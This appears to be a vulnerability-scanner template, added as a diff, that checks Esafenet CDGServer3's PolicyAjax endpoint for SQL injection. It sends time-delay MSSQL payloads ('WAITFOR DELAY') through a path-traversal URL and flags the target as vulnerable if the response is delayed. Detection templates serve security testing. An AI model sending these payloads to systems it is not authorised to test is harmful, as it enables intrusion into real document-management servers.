@@ -1,0 +1,25 @@
+name: 亿赛通-电子文档安全管理系统-PolicyAjax-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+timeout: 6
+matchCount: 2
+rules:
+  - method: POST
+    path: /CDGServer3/dojojs/../PolicyAjax
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      command=selectOption&id=1';WAITFOR DELAY '0:0:3'--&type=JMCL
+    expression:
+      status: 200
+      sleep: 3
+  - method: POST
+    path: /CDGServer3/dojojs/../PolicyAjax
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      command=selectOption&id=1';WAITFOR DELAY '0:0:5'--&type=JMCL
+    expression:
+      status: 200
+      sleep: 5
